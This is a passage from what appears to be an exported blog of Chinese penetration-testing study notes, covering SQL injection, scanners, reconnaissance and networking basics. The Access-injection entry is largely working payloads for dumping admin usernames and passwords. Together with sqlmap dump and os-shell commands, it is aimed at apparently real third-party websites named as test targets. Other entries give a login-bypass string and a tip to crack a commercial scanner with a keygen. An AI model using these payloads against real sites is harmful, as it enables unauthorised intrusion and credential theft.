parameter &apos;id&apos; is vulnerable. Do you angt to keep testing the others (if any)?[y/N] it looks:like the back-end DBMS is &quot;Microsoft SQL Server&quot;. Do you want to skip test payload: specific for other DBMSes?[Y/n] -- current-user//查看当前用户 --dbs SA搞法 --os-shell --current -db --tables -D cracer --columns -T admin -D cracer --dump -T admin -D cracer//列数据(全列出来) --dump -C username,password -T admin -D cracer --sql-shell select * from admin 测试源码:v5shop]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记09-11-Access注入]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B009-11-Access%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[Access数据库注入详解 Access Mssql Mysql,oracle,postgresql,Db2(比oracle大一些)等 网站访问模型 数据库管理系统/数据库(数据库服务器)-&gt;网站(WEB服务器)-&gt;Client 漏洞成因: 注入流程: 客户端:参数值等数据被修改-&gt;... reg:www.xxx.com/xxx.asp?id=31 and 1=1 来检测安全狗 +-*/ 0/1,只要执行就说明存在注入 Access达到100M左右性能就会下降 asp链接access数据库代码 &quot;Driver={microsoft access driver(*.mdb)};dbq=*.mdb;uid=admin;pwd=pass;&quot; dim conn set conn=server.createobject(&quot;adodb.connection&quot;); conn.open&quot;provider=Microsoft.ACE.OLEDB.12.0;&quot;&amp;&quot;data source=&quot;&amp;server.mappath(&quot;bbs.mdb&quot;) id=31.0 id=31.1 过安全狗 前台看不到就后台抓包 判断注入点 &apos; And 1=1 And 1=2 / -0 .0 .1 判断数据库注入 and exsits(select * from msysobjects)&gt;0 access and exsits(select * from sysobjects)&gt;0 sqlserver 判断数据库表 and exists(select * from admin) 判断数据库列名 and exists(select admin from admin) 判断字段长度 order by 20 判断 /*and 1=2*/ union select 1,2,3,4,5,6,7,8,9 from admin (判断是否是非数字列) 数据库联合查询 and 1=2 union select 1,2,admin,4,password,6,7,8,9 from admin /*where id=2*/ (password可以在非数字列任意位置上) access数据库 常见的管理员表名 admin admin_user admin_msg admin_usr admin_login username manager msg_user msg_login useradmin user_msg userlogin users member 管理员表下常见的管理员列名 admin admin_user username users usr user_login user_name name loginame admin_login msg_name 密码列名: password pwd pass user_pass 附: 判断账户密码的长度 and (select len(admin) from admin)=5 如果返回正常说明管理员账户长度为5 and (select len(password) from admin)=5 猜解管理密码长度是否为5 猜解管理账号的第一个数据 通过判断ascii码来判断 and (select top 1 asc(mid(admin,1,1)) from admin)&gt;100返回正常说明大于,不正常说明不大于 and (select top 1 asc(mid(admin,1,1)) from admin)&gt;50 返回正常说明大于 and (select top 1 asc(mid(admin,1,1)) from admin)=97 返回正常说明等于97,97对应的 字母为a,以此类推 判断管理员账户的第二数据 and (select top 1 asc(mid(admin,2,1)) from admin)&gt;100 返回正常说明大于,不正常说明不大于 第三个 and (select top 1 asc(mid(admin,3,1)) from admin)&gt;100 返回正常说明大于,不正常说明不大于 判断管理员密码的第一个数据 and (select top 1 asc(mid(password,1,1)) from admin)&gt;100 返回正常说明大于,不正常说明不大于 测试站点: http://www.jnqtly.cn/cp11.asp?id=1129 http://fc1885.com/display1_new.asp?id=237 sqlmap来跑数据 sqlmap.py -u &quot;http://fc1885.com/display1_new.asp?id=237&quot; 回车 判断注入 sqlmap.py -u &quot;http://fc1885.com/display1_new.asp?id=237&quot; --tables 列表名 sqlmap.py -u &quot;http://fc1885.com/display1_new.asp?id=237&quot; --columns -T admin sqlmap.py -u &quot;http://fc1885.com/display1_new.asp?id=237&quot; --T admin -C admin,password --dump 列数据 常用注入工具: 阿D,明小子,穿山甲,havji,sqlmap等工具 Access数据库高级玩法 偏移注入: Mantra id=4827 -0 id=4827 order by 38 id=4827 UNION SELECT ..... 用*代替字段长度 用*号来从最后一个字段数22向前逐个删除来代替,直到显示正常为止,*代表了所有admin表的字段 http://127.0.0.1:99/0/Production/PRODUCT_DETAIL.asp?id=1142 union select 1,2,3,4,5,6,7,8,9,10,... from admin http://127.0.0.1:99/0/Production/PRODUCT_DETAIL.asp?id=1142 union select 1,2,3,4,5,6,7,8,9,... from admin http://127.0.0.1:99/0/Production/PRODUCT_DETAIL.asp?id=1142 union select 1,2,3,4,5,6,7,8,... from admin 用*代替字段长度 http://127.0.0.1:99/0/Production/PRODUCT_DETAIL.asp?id=1142 union select 1,2,3,4,5,6,7,8,9,...,* from admin http://127.0.0.1:99/0/Production/PRODUCT_DETAIL.asp?id=1142 union select 1,2,3,4,5,6,7,8,...,* from admin 带入计算公式 22-16=6 16,10(代第一个公式),4(代第二个公式) 10+6*2=22 4+6*3=22 union select 1,2,3,4,5,6,7,8,9,10,a.id,b.id,* from (admin as a inner join admin as b on a.id=b.id) union select 1,2,3,4,a.id,b.id,c.id,* from (admin as ainner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id) 偏移注入 第二种方法: 1.后台登陆文件源码表单里面的参数值 2.看网站地址链接上的规则 3.是否判断出对方使用的cms程序 垮裤查询 条件:同服务器下的站点有注入,知道对方站的数据库绝对路径对方数据库表,表中的字段名可以用这个方法来跨库查询 绝对路径(D:/wwwroot/...*.mdb.asa.asp) reg: a是目标站点b是存在注入的站点,a,b是同服务器的站点 admin为数据库中的表 user为数据库中admin表的段 password为数据库中admin表的段 跨库查询 http://www.com/news/type.asp?type?id=1 and 1=2 union select 1,2,user,4,5,6 from [D:\wwwroot\1\Databases\xycms.mdb].admin http://127.0.0.1:81/0/Production/PRODUCT_DETAIL.asp?id=1451 union select 1,2,username,4,5,6,7,8,9,password,11,12... from [D:\wwwroot\1\Databases\xycms.mdb].admin http://127.0.0.1:99/0/Production/PRODUCT_DETAIL.asp?id=-1513%20UNION%20SELECT%201,2,admin,4,5,6,password,8,9%20from%20 admin_user%20in%20&apos;C:\Users\Seven\Desktop\webpentest\1\xydata\xycms.mdb&apos; &quot;%20&quot;代表空格 写入文件 执行命令 挖掘0day 代码审计 xycms 通杀0day union select 1,admin,3,4,password,6,7 from admin_user]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记08-漏洞分析03]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B008-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%9003%2F</url>
    <content type="text"><![CDATA[C段 C段是一个ip地址的概念，主要是利用ip某个段地址，通过arp协议的利用，进而达到对目标主机的渗透测试效果。 3389,1433 子域 我们正常访问的域名通常都是www.cracer.com，一般如果一个大站点，为了从功能上划分和便于管理，通常会创建不同的站点。而这些站点可能为bbs.cracer.com、xss.cracer.com 、she.cracer.com，而这些域名我们称之为子域。这些域名和主站有着千丝万缕的关系，有的可能后台登录密码、数据库连接密码相同、有的可能都在一个服务器上，或者在同一个网段内。所以在渗透中子域也是我们不可忽略的捷径。 百度-&gt;转到父目录 暴库绕过防下载 #sdsf.mdb 下载时改成 %23sdsf.mdb #-&gt;%23 #@!$%^&amp;*asdfkladsf@!#.mdb %23@%21%24%25%5E%26%2aasdfkladsf@%21%23.mdb URL转码:漏洞分析-&gt;Mantra reg: #@!$%^&amp;*asdfkladsf@!#.mdb-&gt;转码,再下载 下载漏洞: reg: http://www.sxzzy.cn/ggjs/news/down.asp?FileName=doc/2012-5/2012053010329973.doc(down类漏洞) 谷歌黑客/爬虫: site:cracer.com inurl down(load).asp 网站后台密码爆破 每个库账号密码1-3个月更新一次 黑客字典 字典生成器 admin &apos;or&apos;1&apos;=&apos;1 破解工具: CMS-&gt;Burpsuite Discuz HTTP Fuzzer可以识别验证码]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记08-漏洞分析02]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B008-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%9002%2F</url>
    <content type="text"><![CDATA[--IBM Security AppScan Standard (主要是扫描漏洞) 扫描-&gt;完全扫描 上方右侧-&gt;Power Tools-&gt;认证测试(Tester) 右侧-&gt;问题 请求交给一个代理(代理可能是软件也可能是服务器):再由代理给服务端. --Burp Suite Professional Spider-&gt;options-&gt;Application Login-&gt;改成Don`t submit login forms 在Target,扫描的网址右键-&gt;Actively scan this host Scanner漏洞扫描 Intruder:压力模糊测试(爆破)-&gt;在监听到右击发送过来之后-&gt;Positions-&gt;type:Payload(逐个测试)-&gt;Simple list(字典)-&gt;将字典加载进来-&gt;Start attack-&gt;结果看Length,有变化的那个 附:乱码修改:User option-&gt;Display-&gt;转码调试 爆破员工或者学校学号什么的,一般都是弱口令 要是账号密码一样的话,用Payload第二种模式 第三种模式:Pillch fork-&gt;Payloads-&gt;set,用户名和密码都可以使用字典的模式,各自跑各自字典,但是以短的跑完为结束 第四种模式:交叉爆破 payloads-&gt;type-&gt;Numbers 在Positions里面找路径页面,并Add,然后在Payloads-&gt;type选Simple list ,,reg:御剑有目录字典. Repeater:绕过上传,跟上传相关,挖掘数据漏洞时用. reg:博彩-&gt;设置安全邮箱-&gt;post请求-&gt;抓包 Sequencer:捕获请求散列的. Decoder:十六进制,即编码加密解密 Comparer:对比功能,可粘贴,可加载 Extender:添加扩展插件,可以添加SQLMap插件 黑客的迂回&quot;打法&quot; 即:实在找不到漏洞呢,就旁站,C段,社工 旁站: 通常由于企业或者学校等部门为了节省开支，经常会把多个网站搭建在一台服务器上，如果这些网站其中一个网站存在漏洞可能导致其他网站沦陷，甚至是整个服务器。 旁站就是我们去查找同一台服务器的其他网站的漏洞，通过测试存在漏洞的站点进一步测试目标站或者服务器。 漏洞扫描 当我们收集到大量旁站信息后，首先进行数据整理。 然后我们通过一些可以批量漏洞扫描的工具进行扫描漏洞。 比如：wvs、御剑、椰树、M7lrv等工具进行目录、注入、漏洞、后台、等相关扫描.]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记08-漏洞分析01]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B008-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%9001%2F</url>
    <content type="text"><![CDATA[nmap 端口扫描 DDoS请求发到Server,Server返回请求,然后Client不再发给Server,Server就会一直等待状态 (防火墙会把这样的请求给拦截) AWVS (用KeyGen破解一下,右下角) New Scan-&gt;Scan single website:要扫描的网站 Scan using saved crawling results:如果有已爬行,就扫描该结果路径 Next-&gt;Scanning profile:(扫描模板)reg:上传文件,谷歌黑客... default就好 Next-&gt;Optimize for following technologies:(支持的脚本) Next-&gt;HTML forms,类似登录界面, 下方是指定用户名/密码 上方是录像功能,录后台登录界面 Finish 等待爬行结束 右侧 是漏洞级别,,红色是高危漏洞 右侧还有3个功能 左侧有SQL漏洞之后,右侧有URL...,这里来找注入漏洞 具体注入点:HTTP headers/request,GET请求 /about.asp?id=7,,,然后在网址上边再测试and 1=1.... Post的话,就全复制然后给sqlmap 上方有Report,生成报告 上方可以修改爬虫功能 左侧Tools-&gt;Target Finder(目标探测),其实是可以扫描C段的 reg:200.1.1.1-254,但是仅能扫80,443端口 这里有个问题:搭建多个站点,如果绑定域名的话,只能是域名访问了 左侧:Subdomain Scanner:子域名探测 左侧:Blind SQL Injector:注入 在爬到的文件右键-&gt;Blind SQL Injector,再返回该栏,就出来内容了 GET /xxx.asp?id=2$(injecthere) HTTP/1.1 Settings里面可以设置注入的内容 HTTP Editor里面,可以添加一个reg: X-Forwarded-For 1.1.1.1&apos;(最后一个单引号,是看一下有木有http头注入) 左侧HTTP Snffer,代理功能 浏览器,设置代理,然后start 设置在上方的Edit Traps 拦截之后,点击ok释放该包 左侧HTTP Fuzzer,设置变量,加载字典开始跑 将请求粘贴过来. Add添加一个爆破类型,然后insert,左侧要先选中加入的位置 左侧Authentication Tester,爆破登录界面 Netsparker Safe3wvs M7lrvCMS]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记07-信息收集]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B007-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[信息收集 域名信息 整站分析 敏感目录 谷歌 hacker 端口扫描 URL采集 旁站C段 信息分析 域名信息 对应IP收集 相关域名对应IP,相关工具:nslookup,一些工具网站 子域名收集 工具:layer,subDomainBrute whois(注册人)信息查询 根据已知域名反查,分析出此域名的注册人,邮箱,电话等. 工具:爱站网,站长工具,微步在线(https://x.threatbook.cn) site.ip138.com,searchdns.netcraft.com 敏感目录 收集方向 robots.txt,后台目录,安装包,上传目录,mysql管理接口,安装页面, phpinfo,编辑器,iis短文件 常用工具 字典爆破-&gt;御剑,dirbuster,wwwscan,IIS_shortname_Scanner等 蜘蛛爬行-&gt;爬行菜刀,webrobot,burp等 端口扫描 nmap,portscan,ntscan,telnet 21-&gt;FTP 22-&gt;SSH 23-&gt;Telnet 110-&gt;POP3 1433-&gt;Sqlserver 3306-&gt;Mysql 3389-&gt;Mstsc 8080-&gt;Tomcat/jboss 9090-&gt;WebSphere等 旁站C段 旁站:同服务器其他站点 C段:同一网段其他服务器 常用工具: web-&gt;K8旁站,御剑1.5 端口-&gt;portscan 整站分析 服务器类型 服务器平台,版本等 网站容器 搭建网站的服务组件,reg:iis,Apache,nginx,tomcat 脚本类型 ASP,PHP,JSP,aspx等 数据库类型 access,sqlserver,mysql,oracle,postgresql等 CMS类型 WAF 谷歌hacker 1.Intext 查找网页中含有xx关键字的网站 reg:Intext:管理员登录 2.Intitle 查找某个标题 reg:intitle:后台登录 3.Filetype 查找某个文件类型的文件 reg:数据挖掘filetype:doc 4.Inurl 查找url中带有某字段的网站 reg:inurl:php?id= 5.Site 在某域名中查找信息 URL采集 采集相关url的同类网站 例如: php?id= 漏洞网站 相同某种指纹网站 常用工具 谷歌hacker url采集器 后台查找 1.弱口令默认后台:admin,admin/login.asp,manage,login.asp等等 常见的后台 2.查看网页的链接:一般来说,网站的主页有管理登陆类似的东西,有些可能被管理员删掉 3.查看网站图片的属性 4.查看网站使用的管理系统,从而确定后台 5.用工具查找:wwwscan,intellitamaper,御剑 6.robots.txt的帮助:robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看 7.GoogleHacker 8.查看网站使用的编辑器是否有默认后台 9.短文件利用 10.sqlmap-sql-shell load_file(&apos;d:/wwroot/index.php&apos;); CDN绕过方法 什么是CDN 如何判断网站有没有使用CDN(超级ping) 1.查找二级域名 2.让服务器主动给你发包(邮件) 3.敏感文件泄露 5.查询历史解析ip 访问绕过cdn 修改hosts文件]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(9)-工具网站与万能秘钥]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-9-%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99%E4%B8%8E%E4%B8%87%E8%83%BD%E7%A7%98%E9%92%A5%2F</url>
    <content type="text"><![CDATA[工具网站: www.exploit-db.com www.sebug.net Acunetix Web Vulnerability Scanner IBM Security AppScan Nessus Metasploit 利用互联网收集信息 1.&quot;Google hack&quot; site:www.nsfocus.com inurl:admin filetype:action 2.万能的&quot;站长工具&quot; tool.chinaz.com 3.自己的双手也很神奇 查找关键字 Power by DEDECMS 源码的注释 网站报错信息 网站版本页面 robot.txt 敏感目录 ... 万能秘钥: 用户名:&apos;or&apos;=&apos;or&apos; 密码:&apos;or&apos;=&apos;or&apos; 一般用于ASP]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(8)-信息收集-爬虫-md5-nmap]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%88%AC%E8%99%AB-md5-nmap%2F</url>
    <content type="text"><![CDATA[信息搜集-目录结构分析 1.信息收集 2.整站目录结构,数据库调用原理 3.批量拿站讲解 信息搜集: dns收集 敏感目录 端口探测 谷歌黑客 子域探测 旁站探测 C段查询 整站识别 waf探测 工具网站 常用的系统: BackTrack parrot(新出的) Kali(BT5现在版本) DNS收集 域名--ip whois查询 站长工具 http://tool.chinaz.com/ netcraft http://searchdns.netcraft.com DNS--ip查询 查询内容 查询工具 主机[A]记录 站长之家 别名[CNAME] netcraft 主机信息[HINFO] dnsenum 邮箱[MB] dnswalk 邮件交换器[MX] dig 指针记录[PTR] lbd 服务记录[SRV] # ns1.2.3.4... 表示解析DNS的服务器 # dnsenum baidu.com 搜集百度的dns和主机名 dns # dns 然后按两下Tab键 # dnsmap baidu.com # whois baidu.com whois查询 (1)根据已知域名反查,分析出此域名的注册人,邮箱,电话等字段,执行以下(2)至(5)反查方式; (2)根据已知域名WHOIS中的注册邮箱来反查得出其它域名WHOIS中注册邮箱与此相同的域名列表; (3)根据已知域名WHOIS中的注册人来反查得出其它域名WHOIS中注册人与此相同的域名列表; (4)根据已知域名WHOIS中的联系电话来反查得出其它域名WHOIS中联系电话与此相同的域名列表; (5)其它反查方式:比如可以根据注册机构,传真,地址,注册商等等方式来反查. 敏感目录收集 mysql管理接口 wwwscan 后台目录 御剑 上传目录 Cansina phpinfo burpsuit robots.txt webrobot 安装包 skipfish 安装页面 uniscan 爬行 websploit reg: http://www.qufutuan.com/robots.txt 直接注入代码查询敏感目录,这个是防止爬行的文件. reg: www.qufutuan.com/manage 御剑查找 cmd5.com --查询MD5 cmd-&gt; java.exe -jar C:\xxx.jar 爬虫需要有一个代理,在34:00时间段左右 进入websploit之后 # show modules use web/dir_scanner show options run namp核心功能: 主机发现(Host Discovery) 端口扫描(Port Scanning) 版本侦测(Version Detection) 操作系统侦测(OS detection) 防火墙/IDS规避(Firewall/IDS evasion) NSE脚本引擎(Nmap Scripting Engine) # nmap -sS xxx.xxx.xxx.xxx]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(7)-网络模型与路由器]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-7-%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%B8%8E%E8%B7%AF%E7%94%B1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[1.网络架构,以及tcp/ip协议参数 2.交换机,路由器的作用及配置 3.交换机,路由器的攻击及登陆密码的破解 网络架构 互联网组成: 小局域网,园区网,如果不上外网基本不用路由器 做数据包转发时用用到路由器或交换机 局域网-局域网之间用光纤,设备用路由器 互联网-&gt;(可以理解为)N多个园区网组成 网线100米,最佳传输不能超过75米 局域网特点和常用设备: 距离短 延迟小 传输速率高 传输可靠 HUB 交换机(目前用的较多) 路由器 光纤-&gt;猫-&gt;交换机(4口)-&gt;电脑 光纤(电话线)-&gt;猫-&gt;电脑(仅一台)-&gt;拨号 公司:光纤(电话线)-&gt;猫-&gt;交换机-&gt;电脑 -&gt;交换机-&gt;电脑 -&gt;交换机-&gt;电脑 ...... 广播风暴-&gt;就是造成环路现象-&gt;上不去网 广域网常用设备: Modem(猫) 路由器 广域网交换机(处理核心流量) 接入服务器 Internet发展历史: 1969年-&gt; 1983年-&gt; ... 1991年底-&gt; 《谢希仁,计算机网络基础,第5版》 Internet的现状 ISP:网通,电信等网络运营商 ISP ... ISP ISP ... ISP 区域性ISP 区域性ISP 国家或国家ISP ↓ NAP(海底光纤) ↓ 国家或国家ISP 网络世界的规则 网络 协议 网络 标准: 数据通信标准分为两类:事实的和法定的 事实标准:未经组织团体承认但已在应用中被广泛使用和接受的就是事实标准(de facto standard) 法定标准:由官方认可的团体制定的标准称为法定标准(de jure standard) 标准化组织: 国际标准化组织(ISO) --&gt;reg:制定的OSR7层模型 电子电器工程师协会(IEEE) 美国国家标准局(ANSI) 电子工业协会(EIA/TIA) 国际电信联盟(ITU) INTERNET工程任务委员会(IETF) 分层网络模型: Core High-Speed Switching(核心层)(核心交换机) Distribution Policy-Based Connectivity(高级交换机在这运行) Access Local and Remote Workgroup Access(最低端) 网络结构 Access 电脑-&gt;交换机 Distribution 交换机-&gt;(汇聚层)三层交换(配置策略)(A不访问B,B不访问A,等等) Core 三层交换-&gt;核心网络交换 Core用途:高速交换整个区域的流量 Core-&gt;三层交换-&gt;路由器(外网)(服务器)(网通) TCP/IP参数 OSI参考模型 OSI RM:开放系统互连参考模型(Open System Interconnection Reference Model) OSI参考模型具有以下优点 简化了相关的网络操作 提供设备间的兼容性和标准接口 促进标准化工作 结构上可以分割 易于实现和维护 OSI分层 应用层 7 表示层 6 5,6,7 叫高层:负责主机之间的数据传输 会话层 5 传输层 4 网络层 3 数据链路层 2 1,2,3,4 叫底层:负责网络数据传输 物理层 1 OSI七层功能 应用层 7 --提供应用程序间通信(应用软件) 表示层 6 --处理数据格式,数据加密等() 会话层 5 --建立,维护和管理会话(QQ等会话) 传输层 4 --建立主机端到端连接(协议) 网络层 3 --寻址和路由选择(路由器) 数据链路层 2 --提供介质访问,链路管理等(交换机) 物理层 1 --比特流传输(网线,光纤,传的reg:虚拟的是0,1) TCP/IP协议栈 OSI TCP/IP 应用层 7 应 表示层 6 用 会话层 5 层 传输层 4 传输层 网络层 3 网络层 数据链路层 2 网络 物理层 1 接口层 应用层 HTTP,Telnet,FTP,TFTP --&gt;提供应用程序网络接口 传输层 TCP/UDP --&gt;建立端到端连接 网络层 IP --&gt;寻址和路由选择 数据链路层(交换机) Ethernet,802.3,PPP --&gt;物理介质访问(只识别物理地址) 物理层 接口和线缆 --&gt;二进制数据流传输 网关:网线-&gt;(外网IP)-&gt;路由器(内网IP:192.168.1.1)-&gt;交换机-&gt;PC 192.168.1.2,网关是192.168.1.1 202.1.1.100 网关在这里就是路由器连接的内网IP 1.2去访问1.5的过程: 1.2数据包-&gt;交换机(仅识别Mac地址?) -&gt;给每个接口发送广播-&gt;1.5的接口返回广播 交换机将每个接口写成mac-zp-&gt;然后找到1.5 IP地址分为4类 类别 最大网络数 A类: 126 0.0.0.0-127.255.255.255 B类: 1638 128.0.0.0-191.255.255.255 C类: 2097152 192.0.0.0-223.255.255.255 D类: 一般不给PC用,给交换机或设备之间用 TCP/IP模型的层间通信与数据封装 HostA PDU 用户数据 应用层 TCP报头 上层数据 传输层 Segment IP报头 上层数据 网络层 Packet LLC报头 上层数据 FCS 数据链路层 Frame MAC报头 上层数据 FCS 010101001010101 物理层 Bit 数据解封装 HostB 应用层 ↑ 上层数据 传输层 ↑ 上层数据 网络层 ↑ TCP+上层数据 数据链路层 ↑ IP+TCP+上层数据 物理层 ↑ LLC报头+IP+TCP+上层数据 ↑ 010101001010101 reg: HostA QQ数据包(封装过程)-&gt;应用层(UDP格式走)-&gt; IP报头(对方IP)-&gt; LLC报头()-&gt; Mac报头(交换机)-&gt; 01010100101010-&gt; HostB MAC报头-&gt; LLC报头-&gt; IP报头-&gt; TCP报头-&gt; HostB 物理层功能: 规定介质类型,接口类型,信令类型 规范在终端系统之间激活,维护和关闭物理链路的电气,机械,流程和功能等方面的要求 物理层介质和物理层设备 物理层介质 -同轴电缆 -双绞线 -光纤 -无线电波 物理层设备 -中继器,集线器 数据链路层功能 网络层功能和设备 网络层协议 网络层地址 -------------------------------------- 1.TCP/IP协议栈 2.TCP/IP协议栈报文封装 3.案例分析 (看PPT) (看那个计算机网络基础) 路由器的介绍: 路由技术是Internet得以持续运转的关键所在. 查找网关中的路由表,然后一步一步来的 路由是指导IP报文发送的路径信息. IP路由过程 (看PPT) 路由器关键功能: 检查数据包的目的地 确定信息源 发现可能的路由 选择最佳路由 验证和维护路由信息 路由的来源-链路层发现的路由 [RTB]display ip routing-table (华为命令) [RTB]show ip ...(思科) 路由的来源-动态路由协议发现的路由 静态和动态路由 静态路由: 由网络管理员手工指定的路由 当网络拓扑发生变化时,管理员需要手工更新静态路由 动态路由: 路由器使用路由协议从其他路由器那里获悉的路由(rip协议)(思科Eigrp)(通用的,OSPF) 当网络拓扑发生变化时,路由器会自动更新路由信息. 路由协议 路由协议是路由器之间交互信息的一种语言.路由器之间通过路由协议共享网络状态和网络可达性的一些信息 . 相互通信的双方必须使用同一种语言才能交互路由信息 路由协议定义了一套路由器之间通信时使用的规则 路由协议维护路由表,提供最佳转发路径. 路由协议分类--作用范围 IGPs:RIP OSPF ISIS EGPs:BGP AS100 AS200 网通 路由协议分类--协议算法 根据协议算法分类 距离矢量路由选择协议(DIstance-Vector) 包括RIP和BGP.其中,BGP也被称为路径矢量协议(Path-Vector) 链路状态路由选择协议(Link-State) 又称为最短路径优先路由选择协议,包括OSPF和IS-IS 路由表: [Quidway] display ip routing-table Routing Tables: Destination/Mask proto pref cost Nexthop Interface 0.0.0.0/0 static 60 0 120.0.0.2 Serial0/0 目标网络, 协议 开钥值 下一跳 从哪个接口出去 0.0是任意网络 还有RIP 低,易执行 OSPF... 8.0.0.0/8(8是子网掩码) 子网掩码谁匹配的最多就走哪一行 路由优先级(Preference) 当存在多个路由来源时,具有较高优先级(数值越小表明优先级越高)的路由来源提供的路由将被激活,用于指导报文的转发. VRP缺省的路由优先级如下: 路由协议 优先级 DIRECT 0(最高) OSPF 10 IS-IS 15 STATIC 60 RIP 100 OSPF ASE 150 最长匹配原则: 查找路由表-&gt;目的地址与掩码分别做&quot;与&quot;操作-&gt;与路由表中的目的地址作比较-&gt;匹配-&gt;挑选出最长匹配项 交换机 交换机(Switch)意为&quot;开关&quot;是一种用于电(光)信号转发的网络设备.它可以为接入交换机的 任意两个网络节点提供独享的电信号通路.最常见的交换机是以太网交换机.其他常见的还有电话语音交换机,光纤交换机等. 交换机的工作模式 应用层 应用层 表示层 表示层 会话层 会话层 传输层 传输层 网络层 (二层交换机) 网络层 链路层 链路层-&gt;链路层 链路层 物理层 物理层-&gt;物理层 物理层]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(6)-linux之vi与网络协议相关命令]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-6-linux%E4%B9%8Bvi%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4%2F</url>
